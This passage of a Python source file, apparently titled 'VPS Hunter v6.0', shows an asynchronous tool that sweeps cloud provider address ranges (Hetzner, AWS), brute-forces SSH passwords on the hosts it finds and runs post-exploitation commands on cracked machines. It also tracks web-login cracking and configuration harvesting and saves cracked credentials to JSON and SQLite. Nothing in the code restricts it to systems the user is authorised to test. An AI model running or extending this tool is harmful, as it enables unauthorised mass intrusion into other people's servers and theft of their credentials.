                        self.log(f"  {G}{BOLD}SSH CRACKED: {user}:{cracked_pwd}{W}", G)
                        self.stats["cracked"] += 1

                        self.log(f"  Running SSH post-exploitation...", C)
                        post = await self.ssh_post_exploit(target.ip, user, cracked_pwd)
                        if post:
                            result.post_exploit = post
                            self.stats["post_exploit_success"] += 1
                            self.log(f"  {G}Post-exploit: {post.get('whoami', 'unknown')} @ {post.get('hostname', 'unknown')}{W}", G)

                        self.store.save_result(result, self.session_id)
                        self.store.mark_scanned(target.ip, target.port)
                        return result

                    tested += len(batch)
                    priority_passwords = priority_passwords[self.ssh_batch_size:]
                    batch = priority_passwords[:self.ssh_batch_size]
                    await asyncio.sleep(0.05)

            if tested < max_test:
                remaining_passwords = ssh_passwords[50:max_test]
                for user in self.ssh_users:
                    if user in priority_users:
                        continue
                    batch = remaining_passwords[:self.ssh_batch_size]
                    while batch:
                        cracked_pwd = await self.ssh_bruteforce(target.ip, user, batch)
                        if cracked_pwd:
                            result.ssh_cracked = {"user": user, "pass": cracked_pwd}
                            self.log(f"  {G}{BOLD}SSH CRACKED: {user}:{cracked_pwd}{W}", G)
                            self.stats["cracked"] += 1

                            post = await self.ssh_post_exploit(target.ip, user, cracked_pwd)
                            if post:
                                result.post_exploit = post
                                self.stats["post_exploit_success"] += 1
                                self.log(f"  {G}Post-exploit: {post.get('whoami', 'unknown')} @ {post.get('hostname', 'unknown')}{W}", G)

                            self.store.save_result(result, self.session_id)
                            self.store.mark_scanned(target.ip, target.port)
                            return result

                        tested += len(batch)
                        remaining_passwords = remaining_passwords[self.ssh_batch_size:]
                        batch = remaining_passwords[:self.ssh_batch_size]
                        if tested % 20 == 0:
                            await asyncio.sleep(0.1)

            self.log(f"  Tested {tested} combinations, no SSH crack", Y)

        if result.vulns or result.cves:
            self.stats["vulnerable"] += 1

        self.store.save_result(result, self.session_id)
        self.store.mark_scanned(target.ip, target.port)
        return result

    async def run_scan(self, provider: str, region: str, count: int):
        semaphore = asyncio.Semaphore(self.max_concurrent)
        batch_size = 25 if IS_TERMUX else 50
        batch_delay = 2.0 if IS_TERMUX else 1.0

        async def bounded_scan(target: Target):
            async with semaphore:
                return await self.scan_target(target)

        self.stats["start_time"] = time.time()
        batch = []

        async for target in self.generate_targets_stream(provider, region, count):
            batch.append(target)

            if len(batch) >= batch_size:
                self.log(f"Processing batch of {len(batch)} targets...", C)
                tasks = [bounded_scan(t) for t in batch]
                batch_results = await asyncio.gather(*tasks, return_exceptions=True)

                for r in batch_results:
                    if isinstance(r, Exception):
                        self.stats["errors"] += 1
                        continue
                    self.results.append(r)

                batch.clear()
                await asyncio.sleep(batch_delay)

        if batch:
            tasks = [bounded_scan(t) for t in batch]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in batch_results:
                if isinstance(r, Exception):
                    self.stats["errors"] += 1
                    continue
                self.results.append(r)

        elapsed = time.time() - self.stats["start_time"]
        self.stats["elapsed_seconds"] = elapsed

    def save_final_summary(self, filename: str = "hunt_summary.json"):
        output = {
            "timestamp": datetime.now().isoformat(),
            "scanner_version": "6.0",
            "stats": self.stats,
            "total_scanned": len(self.results),
            "alive_hosts": len([r for r in self.results if r.alive]),
            "vulnerable_hosts": [
                asdict(r) for r in self.results
                if r.vulns or r.ssh_cracked or r.web_cracked or r.cves
            ],
            "cracked_hosts": [
                asdict(r) for r in self.results if r.ssh_cracked or r.web_cracked
            ],
            "config_harvested": [
                asdict(r) for r in self.results if r.config_harvested
            ],
            "post_exploit": [
                asdict(r) for r in self.results if r.post_exploit
            ],
            "os_breakdown": self._os_breakdown(),
            "session_id": self.session_id
        }
        with open(filename, "w") as f:
            json.dump(output, f, indent=2)
        self.log(f"Summary saved to {filename}", G)
        return output

    def _os_breakdown(self) -> Dict:
        breakdown = {}
        for r in self.results:
            if r.os_guess:
                os_name = r.os_guess.split("(")[0].strip()
                if os_name not in breakdown:
                    breakdown[os_name] = {"count": 0, "avg_confidence": 0}
                breakdown[os_name]["count"] += 1
                breakdown[os_name]["avg_confidence"] += r.os_confidence
        for os_name in breakdown:
            if breakdown[os_name]["count"] > 0:
                breakdown[os_name]["avg_confidence"] /= breakdown[os_name]["count"]
        return breakdown

    def print_summary(self):
        elapsed = self.stats.get("elapsed_seconds", 0)
        os_data = self._os_breakdown()

        print(f"\n{BOLD}{'='*60}{W}")
        print(f"{BOLD}{C}  SCAN COMPLETE{W}")
        print(f"{BOLD}{'='*60}{W}")
        print(f"  Total targets:    {self.stats['scanned']}")
        print(f"  Alive hosts:      {G}{self.stats['alive']}{W}")
        print(f"  Vulnerable:       {Y}{self.stats['vulnerable']}{W}")
        print(f"  SSH cracked:      {R}{sum(1 for r in self.results if r.ssh_cracked)}{W}")
        print(f"  Web cracked:      {R}{self.stats['web_cracked']}{W}")
        print(f"  Config harvested: {M}{self.stats['config_harvested']}{W}")
        print(f"  Post-exploit:     {G}{self.stats['post_exploit_success']}{W}")
        print(f"  Total cracked:    {R}{self.stats['cracked']}{W}")
        print(f"  Errors:           {self.stats['errors']}")
        print(f"  Time elapsed:     {elapsed:.1f}s")
        if elapsed > 0:
            print(f"  Rate:             {self.stats['scanned']/elapsed:.1f} hosts/sec")
        print(f"\n  {BOLD}OS Detections:{W}")
        for os_name, data in sorted(os_data.items(), key=lambda x: x[1]["count"], reverse=True):
            print(f"    {os_name}: {data['count']} ({data['avg_confidence']*100:.0f}% avg conf)")
        print(f"{BOLD}{'='*60}{W}\n")

    async def hunt(self, provider: str = "hetzner", region: str = "de", count: int = 50):
        self.banner_text()
        self.log("Initializing VPS Hunter v6.0...", B)
        self.log("Pure Python Async | SQLite Persistence | No Root Required", B)

        await self.init_session()
        self.store.start_session(self.session_id, provider, region, count)

        self.log(f"Starting hunt: {provider.upper()} {region.upper()} | {count} targets", M)

        await self.run_scan(provider, region, count)
        self.print_summary()
        self.save_final_summary()
        self.store.complete_session(self.session_id, self.stats)

        await self.close()


def setup_termux():
    import subprocess
    packages = [
        "python", "python-pip", "curl", "wget", "git", "openssl-tool",
        "libffi", "libxml2", "libxslt", "clang", "make", "procps"
    ]
    print(f"{C}[+] Setting up Termux environment...{W}")
    for pkg in packages:
        print(f"{Y}[+] Installing {pkg}...{W}")
        result = subprocess.run(["pkg", "install", "-y", pkg], capture_output=True)
        if result.returncode != 0:
            print(f"{R}[!] Failed to install {pkg}{W}")

    pip_packages = ["aiohttp", "asyncssh", "paramiko"]
    for pkg in pip_packages:
        print(f"{Y}[+] Installing {pkg} (pip)...{W}")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg], capture_output=True)

    os.makedirs(os.path.expanduser("~/vps_hunter"), exist_ok=True)
    print(f"{G}[+] Setup complete!{W}")


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="VPS Hunter v6.0 - Cloud Instance Scanner (Termux Optimized)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python vps_hunter_v6.py -p hetzner -r de -c 100
  python vps_hunter_v6.py -p aws -r us -c 500 --max-concurrent 10
  python vps_hunter_v6.py --setup
        """
    )
    parser.add_argument("-p", "--provider", choices=["hetzner", "aws"], default="hetzner")
    parser.add_argument("-r", "--region", choices=["de", "us"], default="de")
    parser.add_argument("-c", "--count", type=int, default=50)
    parser.add_argument("--max-concurrent", type=int, default=8)
    parser.add_argument("--rate-limit", type=float, default=0.1)
    parser.add_argument("--setup", action="store_true")

    args = parser.parse_args()

    if args.setup:
        setup_termux()
        sys.exit(0)

    hunter = VPSHunter(
        max_concurrent=args.max_concurrent,
        rate_limit=args.rate_limit
    )

    try:
        asyncio.run(hunter.hunt(args.provider, args.region, args.count))
    except KeyboardInterrupt:
        print(f"\n{R}[!] Hunt interrupted{W}")
        hunter.print_summary()
        hunter.save_final_summary("hunt_summary_interrupted.json")
        hunter.store.complete_session(hunter.session_id, hunter.stats)
    except Exception as e:
        print(f"\n{R}[!] Fatal error: {e}{W}")
        hunter.save_final_summary("hunt_summary_error.json")
        hunter.store.complete_session(hunter.session_id, hunter.stats)
